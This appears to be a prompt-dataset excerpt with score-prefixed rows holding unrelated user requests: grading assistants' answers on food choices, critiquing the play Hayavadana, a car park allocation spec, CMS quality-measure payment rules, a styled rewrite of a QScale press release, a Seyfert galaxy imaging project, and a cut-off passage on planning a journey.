[3.3032875061035156, 4.1342997550964355, "\"Listen to Assistants 1, 2, 3, and 4's answers to the following questions and give them a score out of 100 and explain why.\n\nquestion: How do cultural, social, and economic factors influence people's food choices, and how can this knowledge be used to promote healthier diets?\n\nAssistants 1: Cultural, social, and economic factors are among the most important factors that influence people's food choices. Cultural factors refer to the customs, beliefs, and traditions that people have when it comes to the foods they eat. Social factors include peer pressure, advertising, and media. Economic factors include cost, availability, and accessibility.\n\nFor example, some cultures emphasize the consumption of large amounts of meat and animal products as a sign of wealth and prosperity. In such circumstances, it can be challenging to promote healthier diets that focus on plant-based sources of protein.\n\nSimilarly, social factors like advertising can influence people's food choices by promoting unhealthy food options that are high in sugar, salt, and fat. These foods tend to be cheap and readily available, making them an attractive option for people who are cost-conscious.\n\nFinally, economic factors affect food choices by limiting access to healthy foods in certain areas or pricing them out of reach for many people.\n\nTo promote healthier diets, it is crucial to understand these cultural, social, and economic factors and address them through education, policy changes, and community-based interventions. For example, raising awareness of the benefits of a plant-based diet, imposing taxes on unhealthy foods, and increasing funding for community gardens and farmers' markets can help encourage healthier food choices. Additionally, working with local businesses and restaurants to provide healthier, affordable meal options can also have a significant impact on improving population health.\n\nAssistants 2: Cultural, social, and economic factors play a significant role in shaping people's food choices. For example, individuals from certain cultures may have a preference for spicy or bitter flavors, while others may prefer sweet or sour tastes. Social norms and traditions also impact what people eat, such as family gatherings where specific dishes are served. Additionally, economic factors like income level and accessibility of food options can affect food choices.\n\nTo promote healthier diets, it is important to understand these influences on food choice and tailor interventions accordingly. One approach could involve using culturally sensitive messaging that highlights the benefits of incorporating more fruits and vegetables into traditional meals. Providing affordable and accessible healthy food options in underserved communities can also help to overcome economic barriers to healthy eating. Finally, creating social support networks around healthy eating habits, such as community gardens or cooking classes, can provide encouragement and accountability for individuals looking to make positive changes to their diet.\n\nAssistants 3: Cultural, social, and economic factors can have a significant impact on people's food choices, as they shape our attitudes, beliefs, and values towards food, as well as our access to and ability to afford healthy food options. Here are some examples of how these factors can influence food choices:\n\nCultural factors: Cultural traditions, social norms, and religious beliefs can influence what foods people choose to eat and how they prepare them. For example, certain cultural groups may have a strong tradition of consuming certain foods, such as meat or dairy, or may have strict dietary restrictions, such as halal or kosher.\n\nSocial factors: Social norms and peer pressure can also influence food choices, as people may feel pressure to conform to certain eating habits or trends. For example, a person may choose to eat a certain type of food because they believe it is popular or desirable among their peers.\n\nEconomic factors: The cost and availability of food can also play a role in people's food choices. People may choose cheaper, processed foods because they are more affordable or more easily accessible, even if they are less healthy.\n\nKnowledge of these factors can be used to develop targeted interventions to promote healthier diets. For example, a public health campaign that targets cultural beliefs and traditions, or a community program that provides affordable access to fresh fruits and vegetables, can help to promote healthier eating habits. Additionally, policies such as subsidies for healthy foods or taxes on unhealthy foods can help to create a more supportive environment for healthy eating.\n\nAssistants 4: Cultural, social, and economic factors play a significant role in shaping people's food choices. For example, cultural traditions and beliefs may dictate what foods are considered appropriate or taboo, while socioeconomic status may limit access to healthy food options. Additionally, marketing and advertising campaigns often target specific demographics with unhealthy food products, further contributing to poor nutrition.\n\nTo promote healthier diets, it is important to understand these underlying factors and address them through education and policy changes. This could include promoting culturally relevant healthy eating messages, increasing access to affordable fresh produce in underserved communities, and regulating junk food marketing aimed at children. By taking an intersectional approach that considers multiple factors impacting food choice, we can work towards creating a more equitable and health-promoting food system.\""]

[4.977190017700195, 7.645998477935791, "Context:\nAct - I\nThe play opens with worship to Lord Ganesha. Bhagwata comes to the stage. He is a character in the Play and also is the narrator of the play. He seeks blessings from Lord Ganesha for the successful performance of the play. Through his narration, he takes the audience to a place, called as Dharampur and introduces the audience to the king Dharmsheel. Then he puts up some rhetorical questions on incompleteness of man and God; and also on the perfection of a man. During his narration, he introduces two characters who are mutual friends. The first one is Devdutta. He is a sharp minded and highly intellectual person. He has defeated poets and Pandits with his knowledge. He is a son of Brahmin. The second one is Kapila. He is a muscular man. He has a great physical strength and he is a son of Lohar (Black Smith). Both Devdutta and Kapila are in contrast as the former lacks power and strength, the latter lacks knowledge and intellectual. According to the playwright, the head of Devdutta (knowledge) and the body of Kapila (physical strength) accomplish a complete man. The narrator compares their pair to the pair of Ram-Laxman, Luv-Kush and Krishna-Balram. All these are the pairs of great brothers in Hindu mythology.\n\nA character, Actor-1 appears on the stage shouting and running towards Bhagwata. He tells Bhagwata that he has just seen a strange creature that looks like a horse (by face) but speaks like a man. That creature has the head of a horse and the rest of the body of a man. Without paying any heed to his talks, Bhagwata asks him to get ready for the play. But he runs away from the stage and soon after he comes back shouting again. Now a strange creature appears on the stage. As earlier described by the Actor-1, the creature has the head of a horse and the body of a man. For a moment, Bhagwata thinks that someone is wearing the mask of horse. He tries to remove the mask but realizes that it is truly half a man and a half horse. Now the creature starts to introduce itself before Bhagwata, Actor-1 and the audience.\n\nThe creature introduces himself as Hayavadana and starts to narrate his story. He tells that once upon a time, a princess had to choose a groom for her marriage. So many Princes approached from far and wide. But the princess fell in love with a horse of an Arabian Prince. She became desperate to marry that horse. Eventually her parents allowed her to do so. She was married to the horse. After 15 years of their marriage, the horse transformed into a celestial being. Now the princess rejected him as her husband. That celestial being cursed her to be a Mare (female horse) and she became so. The princess give birth to Hayavadana. Now Hayavadana wants to get rid of this cursed life. Bhagwata asks him to go to goddess Kali temple in chitrkut. He also asks the Actor-1 to accompany him on the way. They leave.\n\nNow Bhagwata moves ahead with the story of the play. Devdutta and Kapila appear on the stage. Devdutta tells Kapila that he wants to marry a woman, namely Padmini. With utmost desire to marry Padmini, he pledges to sacrifice his arms to Goddess Kali and his head to Rudra. Kapila goes to Padmini and presents the Proposal to marry Devdutta. Devdatta and Padmini Marry. By the time, Devdutta realizes that Padmini is attracted towards Kapila and vice versa. Now Padmini is pregnant. Devdutta knowingly tries to put off the program of visiting Ujjain. He tells Kapila that Padmini is ill. But Padmini gives her consent before Kapila. They all three leave for Ujjain. Padmini repeatedly praises Kapila's physical strength before Devdutta. Devdutta feels jealous but he does not blame Padmini. Kapila and Padmini go to Rudra Temple but Devdutta denies to accompany them. Devdutta knows that Kapila has such a physical strength and beauty that any woman can get attracted towards him. Devdutta goes to goddess Kali temple where he reminds himself of his pledge to sacrifice his head to the Goddess Kali. He Wishes for the Wellness of Kapila and Padmini. He beheads himself with a sword and dies.\n\nMeanwhile, Kapila and Padmini come out of the temple. Kapila gets worried on finding Devdutta nowhere. He leaves Padmini and starts searching for his friend. Finally he reaches in the same Temple and feels shocked to see his friend dead. He feels himself responsible for all this. Kapila takes the same sword and beheads himself. Soon Padmini reaches there and she has no clue how they got died. She considers herself responsible for the duel between the two friends and their deaths. She provokes the Goddess Kali and also tries to kill herself. The Goddess Kali appears and stops her. The Goddess asks her to place the heads with their respective body so that the Goddess will re-join them with her magical powers and bring them back to life. The Goddess also appreciates the two friends. Padmini follows the command in a hurry. The Goddess disappears. Padmini, being thankful to goddess kali, gets a bit relaxed. But soon she realizes her mistake. She has mistakenly placed the heads with irrespective body. So now Devdutta's head is joined with Kapila's body and vice versa. Soon they regain their senses. For a moment, the two friends are confused. Both make a claim for Padmini. The man with Devdutta's head, makes a plea that head is the master of the body. So he has the right over Padmini. The man with Kapila's head makes a plea that Padmini has remained with Devdutta's body. So he has the right over Padmini. Meanwhile Bhagwata, the narrator, comes on the stage. All the characters become statues for a moment and the narrator addresses the audience. He asks them to think of a solution to this problem. Act 1 ends.[7]\n\nAct - II\nThe act begins as the narrator repeats the same question- \" What is the solution? \". He also talks about the story of \u2032Vikramaditya and Betaal\u2032 [8] where the king Vikrama replies to Betaal that the mind (head) is the master of the body. It is head that gives recognition to an individual. Bhagwata tells that they all three go to a hermit seeking solution for this problem. The words of hermit are heard on the stage that Devdutta's head is the Swami (husband) of Padmini. Devdutta and Padmini accept this in delight. Kapila, being disappointed, leaves for the forest. The time passes. Devdutta brings some dolls. These dolls also play the role of narrator. He starts losing his physical strength and as a result they are losing mutual interest. A child is born. Devduta goes to buy new dolls from the fair in Ujjain. Bhagwata again appears on the stage and tells that Kapila has regained his physical strength. Padmini meets him in the forest and also tell him that it is Kapila's son as it is born from Kapila's body. But Kapila does not accept it. Being a little reluctant, they get ready to fulfill their physical desires.\n\nIn search of his wife, Devdutta reaches there in the forest. Finding them together, he finds himself the similar situation as he was before. To put an Ultimate end to this problem, Devdutta takes out the sword and challenges Kapila for a duel. Both gets killed. Padmini finds herself lonely. Bhagwata comes there and she hands him over the child and the same dolls. She asks him to hand it over to Devdutta's Brahmin father Vidyasagar after five years. She leaves the stage by declaring that she is going to perform Sati. Bhagwata decides to end the play with his speech. A loud shout is heard on the stage. Actor-1 comes and claims that he has heard Hayavadana chanting National Anthem and patriotic songs. Then Actor-2 appears with Devdutta's son of age 5 now. The boy has two dolls. Hayavadana comes there. Bhagwata and Actor-2 are talking lightly and creating fun. They all starts laughing. That boy too starts laughing and the dolls slip out of his hand. Bhagwata says that the boy hasn't expressed any emotions of happiness, anger, sorrow in past 5 years. Today he is smiling just because of Hayavadana.\n\nNow Hayavadana tells his story. when he was trying to behead himself in the temple, the goddess Kali appeared. Hayavadana tells his desire. The goddess Kali without listening to him fully, gives him blessings. Hayavadana becomes a complete Horse instead of becoming a complete man. Yet he is satisfied. He still has ability to speak like a man. He wants to lose this voice. He is singing national Anthem as he believes that people who sing national anthem, lose their voice early. Meanwhile he sobs. The boy starts singing a tragic song which was chanted by his mother, Padmini. Hayavadana tries to laugh and his voice completely changes into a horse'. Now Hayavadana is a complete horse.\n\nBhagwata asks the Actor to go to brahmin Vidyasagar and inform him that his grandson is coming to him, riding on a great horse. Bhagwata thanks Lord Ganesha for the successful performance of the play.\n\nAim: Write an elaborate critique of the play without revealing the plot."]

[8.850777626037598, 3.708345651626587, "DAS\nPurpose\nThe Dynamic Allocation System (DAS) is a resource management tool designed to maximize the efficiency and effectiveness of car park resources such as Time, Space, and Energy. By minimizing waste and optimizing productivity, DAS can help reduce costs and improve operational efficiency. Through a simple booking process, DAS provides an allocation of resources that meets the needs of the user.\n\n \nScope/Targets\nWhen allocating resources, it is essential to have clear objectives that the system should strive to achieve. These objectives can range from minimizing the number of movements in and out of lanes, reducing the amount of car park space used, and minimizing the number of driver trips, to maximizing efficiency when parking and pulling from lanes, minimizing the distance drivers walk, and reducing the time taken from block park to departures. However, different operations will have different priorities when it comes to these objectives. Therefore, DAS should come with a customizable settings page that allows users to prioritize their targets according to their specific needs. This settings page should be independent per operation as large car parks with few staff will have different requirements than small car parks with many staff. The target must be clear and unambiguous in order for it to be properly implemented. For example, if the target is to reduce driving time between block park and departures, then a prerequisite would be knowing the coordinates of the lanes or car park layout so that an efficient solution can be calculated.\n\n\n\n\n\n\nRequirements\nIn order for DAS to meet its targets, there are several factors that need to be taken into consideration. The settings page should be used to determine which data is necessary for DAS to function properly on a given dataset. This includes, but is not limited to: \n\u2022 Bookings Return Date\n\u2022 Bookings Return Terminal\n\u2022 Size of Block Park Area(s)\n\u2022 Size of Lanes\n\u2022 Size of Departures Area(s)\n\u2022 Speciality Area(s) (Valet Zones, EV Zones, Undercover Zones, Extra Long or Extra Wide Vehicles etc.)\n\u2022 Locations of Lanes, Entrances & Exits to Block Park and Entrances & Exits to Departures (for calculating distances between Lanes themselves, and lanes to departures)\n\u2022 Staff Availability\n\u2022 Staff Shift Times\n\u2022 Availability of Lanes / Zones (e.g. are Some Zones only available in Summer?)\n\u2022 Multi Terminal Lanes\n\u2022 How far in advance we are looking for similar arrivals (+ Maximum time before we close & audit a lane)\nThe system should be customizable in terms of which data sets will be available for DAS to use.\n\nSegments\nDAS Segments are a key component of allocation. The system can be configured as either Flexible or Fixed segments. Fixed Segments are a more restrictive approach, where pre-selected times of the day are manually input. The current KMOS segment editor could be expanded to include different segments depending on the day, allowing DAS to function similarly to KMOS without the need for a Key Master. Flexible Segments offer more potential but also more complexity. This approach allows DAS to look ahead at predicted arrivals and departures, combine this data with its targets, and determine its set of segment times per individual day of the year. The more data sets available, the more efficient this approach will be.\n\n\n\n\n\n\n\nSolution\nOnce DAS has a set of targets and knows the data sets that will be available at point of allocation you can then configure the algorithm that\u2019ll be used to calculate the final allocation. This is the complex bit so that when you feed DAS a booking (or set of bookings) it follows the algorithm step by step until it produces the allocation.\nAn example would be something like the below\n\n \nOther factors to consider are Manual Overrides (the ability to allow intervention by a User to change lane allocations). Recalculations (after a day has passed, Non Arrivals / Overstays may mean there is now more or less space available than expected). Unexpected Events; an Incident (e.g. a crash) could cause a temporary lane closure that may affect future allocations for a period. \n\nFinally DAS should also be periodically reviewed, either manually or by itself to look for improvements. Particularly in the case when there is a limited set of data to begin with. After a period of operation it should be able to detect certain information with greater accuracy (such as weekly trends & seasonal trends). It could then suggest possible changes to the algorithm which if taken into account could lead to more efficiencies.\n\nOverall, DAS is a powerful tool that can be used to automate the allocation of resources in a variety of scenarios. With the right configuration and data sets it can be used to make decisions quickly and accurately, saving time and money."]

Below is the explanation of how the payment is determined. I need you to help me to understand this policy. I am a \"high-needs\" entity, I am subject to which quality measures? I am in PY2022 now. 1.1 Application of Quality Assessment to Final Financial Reconciliation\nThe process of determining the impact of quality measurement and performance on the PY Benchmark is summarized in this section using PY2022 as an example. The steps are as follows:\n\n\u2022 CMS develops Quality Benchmarks for each P4P measure.\n\u2022 Component Quality Scores are calculated: P4R Quality Measures are assessed, and P4P Quality Measures are compared against their Quality Benchmarks to determine performance levels.\n\u2022 Component Quality Scores are weighted to calculate the Total Quality Score.\n\u2022 (PY2023\u2013PY2026 only) CI/SEP criteria are assessed to determine the amount of the Quality Withhold to which the Total Quality Score will be applied.\n\u2022 (PY2023\u2013PY2026 only) HPP funds are distributed.\n\n1.1.1 Step 1. CMS Develops Quality Benchmarks for Each P4P Measure\nIn PY2022, ACR and UAMCC will have P4P components. These measures assess the occurrence of undesirable outcomes\u2014thus, lower measure scores represent better performance. Performance levels for each DCE are determined by comparing their Quality Measure scores with the relevant Quality Benchmark. The DCE earns a performance level for each measure based on where the measure score falls in comparison to the benchmark threshold values.\n\nTable 2-6 presents hypothetical Quality Benchmark distributions for Standard/New Entrant DCEs (using historical Medicare claims data) for both P4P measures. For example, a DCE with a measure score or risk-standardized readmission rate (RSRR) of 15.10% for ACR would be in the 50th percentile group for that measure (the score exceeds the threshold for the 60th percentile group but is less than the maximum threshold for the 50th percentile group). A DCE with a measure score or RSRR of 15.60% for ACR would be in the 20th percentile group for that measure (the score exceeds the threshold for the\n25th percentile group but is less than the maximum threshold for the 20th percentile group). A DCE with a measure score of 74.89 admissions per 100 person-years for UAMCC would be in the 10th percentile group (the score exceeds the threshold for the 15th percentile group but is less than the maximum threshold for the 10th percentile group).\n\nTable 2-6. Hypothetical Benchmark Distributions for ACR and UAMCC for Comparison with Standard and New Entrant DCE Measure Scores\n\nPercentile 5 10 15 20 25 30 40 50 60 70 80 90\nACR 16.34 15.99 15.79 15.68 15.57 15.47 15.31 15.18 15.08 14.95 14.82 14.6\nUAMCC 82.5 75.23 71.08 68.43 66.67 64.68 61.2 58.48 55.98 53.37 50.16 46.12\n\nPlease note that Table 2-6 presents an example only. These are not the final Quality Benchmarks and are not intended to provide an indication of the final Quality Benchmarks. Historically, Quality Benchmarks for other models have been released prior to the start of a given PY. However, observed and anticipated changes in utilization and outcomes resulting from coronavirus disease 2019 have made it inappropriate to use data from 2020 for Quality Benchmarking. Given the likelihood of ongoing impacts on current and future PYs, CMMI is taking a different approach for GPDC quality benchmarking.\n \n\nFor PY2021, GPDC Quality Benchmarks will not be released until June 2022 and will be based on a hybrid approach, combining historical and concurrent data from two discontinuous 12-month periods, the calendar years 2019 and 2021. A DCE\u2019s Final Earn-Back Rate for PY2021 will be determined during final reconciliation, which will occur in 2023.\n\nFor PY2022, GPDC Quality Benchmarks will shift to being based only on data from the 12-month period concurrent with the performance year. Starting with the first quarterly quality report for PY2022, CMMI will provide provisional quality benchmarks to DCEs in their quarterly reports, which will be calculated based on data from the same reporting period (i.e., April 1, 2021-March 31, 2022 for PY2022 Q1). The provisional benchmarks will be updated in each subsequent quarterly report with data from the same period being used to calculate DCE\u2019s performance. Because the DCE performance and benchmarks will be based on the same time-period and have the same exact risk adjustment coefficients, DCEs will have a more accurate picture from quarter to quarter of their performance relative to the benchmark. A DCE\u2019s Final Earn-Back Rate for PY2022 will be based on quality benchmarks calculated using data from calendar year 2022 and will be determined during final reconciliation, which will occur in 2023. As with the hybrid approach for PY2021, the use of concurrent benchmarks for PY2022 will avoid potential coronavirus disease 2019 impacts.\n\n1.1.2 Step 2. Component Quality Scores Are Calculated: P4R Quality Measures Are Assessed, and P4P Quality Measures Are Compared against Their Quality Benchmarks to Determine Performance Levels\nP4R Component: For PY2022, 4% of the 5% Quality Withhold is associated with P4R. The claims-based measures of ACR, UAMCC, and DAH (for High Needs Population DCEs only) comprise 2% of the Quality Withhold, and the CAHPS Measure comprises 2%. There are therefore two Component Quality Scores associated with P4R, one for the claims-based measures, and one for CAHPS.\n\u2022 All DCEs will meet the requirement for the claims-based measures and automatically earn a Component Quality Score of 100% for the portion of the withhold tied to the P4R claims-based measures in Table 2-3.\n\u2022 All DCEs that authorize a survey vendor to conduct the CAHPS Survey will receive a P4R Component Quality Score for CAHPS of 100%. DCEs that do not authorize a survey vendor to conduct the CAHPS Survey will receive a P4R Component Quality Score for CAHPS of 0%. DCEs that are exempt from CAHPS will have a single P4R Component Quality Score of 100%.\nP4P Component: The PY2022 P4P component will be the same as PY2021, which combines the ACR and UAMCC measures. The highest performance level (i.e., percentile) achieved for either Quality Measure determines the P4P Component Quality Score. Furthermore, the P4P component is considered pass/fail\u2014all DCEs with at least one measure at or exceeding the 30th percentile will pass and receive a 100% Component Quality Score.\n\nAs in PY2021, in PY2022, a sliding scale approach will be applied to DCEs that do not meet the 30th percentile threshold on at least one of the two measures. The sliding scale allows DCEs to earn back at\n \n\nleast a portion of the 1% withhold, based on their highest measure performance. The details of the sliding scales are presented in Table 2-7. In the example in Step 1 above, where a DCE achieved the 20th percentile for ACR and the 10th percentile for UAMCC, the DCE would receive a P4P Component Quality Score of 80%.\n\nTable 2-7. Sliding Scale Earn-Back for P4P Component Quality Score, PY2021 and PY2022\n\nPercentile Met P4P Component Quality Score\n\u2265 30th 100%\n25th to < 30th 95%\n20th to < 25th 80%\n15th to < 20th 60%\n10th to < 15th 40%\n5th to < 10th 20%\n< 5th 0%\n1.1.3 Step 3. Component Quality Scores Are Weighted to Calculate the Total Quality Score\nAfter assessing P4R measures and determining performance levels for each P4P measure, CMS calculates Component Quality Scores for each DCE. The component weight is the proportion of the overall Quality Withhold tied to that component. In PY2022, there are three Component Quality Scores. The first component is P4P, based on ACR and UAMCC. The P4P component has a weight of 1/5, contributing 1% out of the 5% Quality Withhold. The second component is P4R for claims-based measures and has a weight of 2/5, contributing 2% out of the 5% Quality Withhold. The third component is P4R for CAHPS and has a weight of 2/5, contributing 2% out of the 5% Quality Withhold. Note that additional P4P components (such as DAH) will be added in subsequent years.\n\nThe Total Quality Score is the percentage of the Quality Withhold eligible for earn-back that a DCE will actually earn back based on its quality performance and reporting. The Total Quality Score is calculated as the sum of the products of the Component Quality Scores and component weights, as shown in the equation below.\n\nTotal Quality Score = \u2211 (Component Quality Scores \\* Component Weights)\n\nIn our example above, the DCE receives a P4P Component Quality Score of 80% based on the sliding scale. The same DCE receives a P4R Component Quality Score for claims-based measures of 100%. This DCE also authorized a CAHPS Survey vendor, earning 100% of the P4R Component Quality Score for CAHPS. The P4P component has a weight of 1/5 and the P4R components each have a weight of 2/5. The Total Quality Score for this DCE is (80% \\* 1/5) + (100% \\* 2/5) + (100% \\* 2/5) = 96%.\n\n1.1.4 Step 4. Total Quality Score Is Multiplied by the Eligible Earn-Back Rate to Determine a DCE\u2019s\nFinal Earn-Back Rate\nIn PY2022, the Eligible Earn-Back Rate will be 5% for all DCEs. A DCE with a Total Quality Score of 96% will have a Final Earn-Back Rate of 4.8%. A DCE\u2019s Final Earn-Back Rate will be determined during final\n \n\nreconciliation, which will occur in 2023 for PY2022. The steps for the example described in this section, starting with Section 2.5, are summarized in Table 3-1."]

Leave out the information about \u00c9nergir, the text should only focus on QScale. Use Snoop Dog tone and style to do the writing.\n\n''QSCALE AND \u00c9NERGIR DEVELOPMENT JOIN FORCES TO DRIVE DECARBONIZATION IN QU\u00c9BEC THROUGH WASTE HEAT RECOVERY\n\nL\u00e9vis, March 16, 2023 \u2013 QScale, a Qu\u00e9bec company that develops environmentally responsible computing centers, and \u00c9nergir Development, hereinafter \u201c\u00c9nergir,\u201d a diversified energy company, announce a collaboration to maximize waste heat recovery in Qu\u00e9bec. \nQScale and \u00c9nergir are taking real steps towards decarbonizing Qu\u00e9bec by combining their expertise in recovering and optimizing the use of heat generated by computing centers. As part of this collaboration, QScale will provide free waste heat from its centers. Having carried out pre-feasibility studies and confirmed technical and economic viability, \u00c9nergir will ensure project implementation from design through to operation. \nThe first waste heat recovery projects under this collaboration will be developed at QScale\u2019s Q01 campus in L\u00e9vis. They will allow reuse of the renewable energy that powers the computing center. Opportunities are currently being analyzed and the first delivery of recovered heat is anticipated by early 2024.\nUltimately, the Q01 campus aims to become one of the largest waste heat recovery providers of its kind in Qu\u00e9bec. Up to 96 megawatts (MW) could be distributed through energy distribution networks, which represents enough energy to heat more than 15,000 Qu\u00e9bec households. \n\u201cOur mission is to design world-class computing centers aligned with sustainable development principles. Supercomputers hosted in our computing centers act as radiators, generating heat. QScale is specifically designed to recover 100% of this waste heat. It is therefore natural for QScale to partner with a recognized partner such as \u00c9nergir, which aims to diversify into sustainable energy distribution,\u201d says Martin Bouchard, co-founder and president of QScale. This collaboration will allow us to maximize the recovery of waste heat from our centers.\u201d \nNot only will these energy loops maximize the benefits of the renewable energy consumed by QScale\u2019s centers; they will also support \u00c9nergir in its mission to help its customers decarbonize by providing them with carbon-neutral heat.\nWaste heat recovery: a key driver in Qu\u00e9bec's decarbonization\nWaste heat recovery involves reusing surplus heat released by a company in its neighborhood. In Qu\u00e9bec, nearly 35% of the energy consumed by large industries is not recovered. The potential is therefore immense. Projects to recover this waste heat are highly beneficial for the environment and are strongly encouraged as part of Qu\u00e9bec\u2019s energy transition policies.\n\u201cOur expertise in energy distribution and infrastructure management positions us as a partner of choice for waste heat recovery initiatives. We are thrilled to be joining forces with QScale for this collaboration, which aligns perfectly with our 2030 Vision to diversify our operations and provide solutions that will contribute to the success of our decarbonization efforts and those of Qu\u00e9bec,\u201d says Jean-Fran\u00e7ois Jaimes, Executive Director, Development, Renewable Energy and LNG at \u00c9nergir.\nA strategic location and tangible benefits for heat users\nThe potential for waste heat recovery from the Q01 campus site is largely the result of its strategic location. Being close to some 100 hectares of farm and industrial land, the campus has an interesting pool of potential users.\nThere are several advantages for users looking to benefit from waste heat recovery, including lower heating bill; possible improvements in their energy balance, allowing them to move towards carbon neutrality; and a steady heat supply thanks to the computing center\u2019s 24/7 operations. \nAbout QScale\nQScale is a Quebec based company that develops environmentally responsible computing centers specifically designed for high-performance computing (HPC), supercomputing, and machine learning. The company\u2019s Quebec City area campus (QScale Q01) is the first colocation facility in Canada to receive the OCP Ready\u2122 recognition, attesting to its energy efficiency and scalability. QScale's technology infrastructures help meet the growing computing needs of global companies while enabling them to achieve their ESG objectives.\""]

The hallmark of a Seyfert galaxy is a\nrelatively bright, starlike central object, easily seen in short exposures, around which long exposures\nreveal the bulge and disk of a spiral galaxy. Such objects are not present in the vast majority\n(\u223c99%) of spiral galaxies. The central object\u2019s luminosity is generally within a factor of ten as\nlarge as that of the rest of the galaxy, in some cases reaching a large fraction of the galaxy\u2019s total\nluminosity. It is usually very difficult to reconcile the size and luminosity of the central object with\nthe properties of normal stellar clusters. The central object also contains ionized gas for which the\nemission-line spectrum indicates an ionization state substantially higher than is typical of the Hii\nregions associated with star formation. Profiles of forbidden lines of the ions of \u201cmetals\u201d in Seyfert\nnuclei \u2014 by which the ionization state is analyzed \u2014 are generally relatively narrow (Doppler\nvelocities of a few hundreds of km/s) and consistent with broadening primarily, but not completely,\nby the rotation of the galaxy. In Seyferts of type 2, this profile also characterizes the hydrogen\nrecombination lines like H\u03b1 and H\u03b2. In Seyferts of type 1, however, the hydrogen recombination\nlines have an additional very broad component to their profile that indicates Doppler velocities of\na few thousand km/s with respect to the rest of the galaxy, much greater than shown by stellar\nabsorption lines which characterize galactic rotation.\nSoon after the discovery of the nature of quasars, it was realized that quasars share many important\nfeatures of Seyfert nuclei. This led to early predictions that quasars would also turn out to be\ngalaxy nuclei \u2014 a prediction borne out shortly after the first CCD cameras enabled precise enough\nsubtraction of the central object to reveal the surrounding galaxy. It also led the astronomical\ncommunity to regard Seyfert\u2019s work as the retrospective discovery of black holes.\nNowaadays, we think that the same basic supermassive-black-hole-plus-accretion-disk geometry ap-\nplies to both main types of Seyferts, and that the difference between types is an artifact of the angle\nat which the disk is viewed: we see deeper toward the center of the disk for type 1 than type 2. This\nsuggests that we should also see Seyfert galaxies intermediate in characteristics between these two\nbasic types. This has turned out to be the case, spawning Seyfert classifications like 1.5 or 1.8, in\nthe same spirit as intermediate Hubble morphological classifications (e.g. Sbc or S0/Sa).\nIn this project, you will repeat some of Seyfert\u2019s classic imaging1 observations, using a CCD camera\ninstead of photographic plates, and demonstrate that Seyfert galaxies each have a starlike, extremely\nluminous central object which is lacking in most spiral galaxies of the same Hubble type. From this,\nyou can infer some bounds on the properties of the central black holes.\nIn this project, you will:\n\u2022 Select a Type 1 Seyfert galaxy, and another galaxy of the same morphological (Hubble) type\nthat is not a Seyfert, taking care that the two are similar in angular size, distance, and\ninclination. Table contains a good list of type 1 Seyferts. The normal galaxy can be selected\nfrom the online Revised Shapley-Ames catalog.\n\u2022 Take both short- and long-exposure LRGB images of each galaxy, taking careful note of the\nseeing in each frame by the sizes of stellar images, and making sure that each galaxy\u2019s disk\n1Most of Seyfert\u2019s 1942 paper is about his spectra of these galaxies, which we will not attempt to reproduce, at\nleast not this semester.\nc\u00a92021 University of Rochester 1\nand spiral arms are imaged at high signal-to-noise, meaning a magnitude limit of 22\u201323 for\nRGB.\n\u2022 Take long-exposure H\u03b1, [Oiii], and [Sii] images of each galaxy, making sure that the nuclei\nand brighter star-formation regions show up well.\n\u2022 Select and average the images with the very best seeing; from this, prepare color images and\none-dimensional plots of G magnitude and B\u2013R color index in each galaxy\u2019s nucleus, as a\nfunction of distance from the center. Do the same for some of the brighter star-formation\nregions, highlighted by H\u03b1.\n\u2022 Average the data in each filter, omitting frames with tracking errors or unusually bad seeing.\n\u2022 Measure and account for the magnitude limit.\n\u2022 Carefully edit the data for bad stellar images, deconvolve the L images, and prepare composite\ntricolor image (LRGB, L-[Sii]-H\u03b1-[Oiii]) of each galaxy that emphasize the nuclear differences\nas well as any differences in the disks.\nBe sure to address the following in your analysis:\n\u2022 Do you reach the magnitude limit that you expect? If not, why not?\n\u2022 Compare the brightness and broadband color of the two galaxies\u2019 central bulges. What differ-\nences are there? From the colors, are these old or young stellar populations?\n\u2022 If all has gone well, a bright, unresolved object dominates the center of the Seyfert, which has\nno counterpart in the normal galaxy. What is the luminosity of this object, and how does it\ncompare to the luminosity of the whole galaxy? What is the maximum diameter of the region\nin the center of the Seyfert nucleus, from which the object\u2019s luminosity emerges?\n\u2022 What fraction of the broadband fluxes in R, G, and B appear in the narrowband images,\nfor the central object, and for the bulges \u2014 outside the central object, for the Seyfert \u2014 of\nthe two galaxies? (Note that [Oiii] is covered by both B and G, and that both H\u03b1 and [Sii]\nare covered in R.) What would be the fraction expected, from the filter bandwidths, for a\ncontinuum source? Do you therefore detect the spectral lines in the Seyfert\u2019s central object?\nHow about the bulges?\n\u2022 How does the boradband color of the Seyfert\u2019s central object compare to the broadband colors\nof the large star-formation regions and young massive star clusters in both galaxies?\n\u2022 Presuming that you have detected spectral lines in the Seyfert\u2019s central object: How do\n[Oiii]/H\u03b1 and [Sii]/H\u03b1 in the central object compare to those ratios for the large star-formation\nregions in both galaxies?\n\u2022 Can you reproduce the color and luminosity of the central object by summing up emission\nfrom stars with a plausible stellar-mass function? If so, what is the stellar density in your\nhypothetical central cluster, and how frequently do the stars collide?\n\u2022 Can you reproduce the flux ratios seen in the spectral lines by scaling up a giant Hii region?\nAbout what spectral type would be required for the exciting stars, presuming that the ionized\ngas in the Seyfert\u2019s central object is photoionized?\n\u2022 Can you reproduce the color and luminosity of the central object with an accretion disk around\na black hole? If so, what are the properties of the disk and black hole?\n\u2022 In particular: what would be the range of black-hole mass required?\n\u2022 Can one or other of the models be ruled out from these observations?\nInclude with your report your best images and plots.

Where do you begin? Why are you going together? To help you understand each other's motives and reach an agreement, you might want to start your discussion by doing two things.\n\nFirstly, look back. Reflect on past holidays and journeys you've had and identify what you enjoyed and valued about those experiences. Use those insights to help you decide on the purpose of this journey. Secondly, look sideways. While you may be going for your own benefit, others may have an opinion too and need to provide input since you'll need their help and support. You might ask them (your stakeholders) what they think before deciding on the journey.\n\nFrom what you learn, you can decide on the purpose of your journey. What experiences and achievements do you need to have for it to be purposeful, fulfilling, and relevant in your lives? Next, decide on your goal. Is getting to a destination all that matters, such as climbing a mountain or crossing an ocean, or do the experiences along the way, the friends you make, and the memories you create matter as much, or perhaps more? Without these discussions and agreements, the chance of arriving at your destination having had the experience you want is left to chance, and success is less likely.\n\nNow that you've decided on your purpose and goal, it's time to make plans. Consider the following:\n\nNorth star: When you can all see a north star that shines a light on the way forward, it's easy to make decisions that everyone will be happy with. What will be the guiding light, the North Star for you as you travel together? What quality, strategy, or characteristic could you unite around that will pull you together and give you an edge that enables you to achieve your goals? It could be a quality like discipline - we always keep moving forward, make sure you keep up. You might get an edge by showing a quality like friendliness. Perhaps, imagination and flexibility are the keys that will unlock your success?\n\nYou can see how these choices will give you a very different travelling experience because they define who you are together - your collective identity, the guiding light 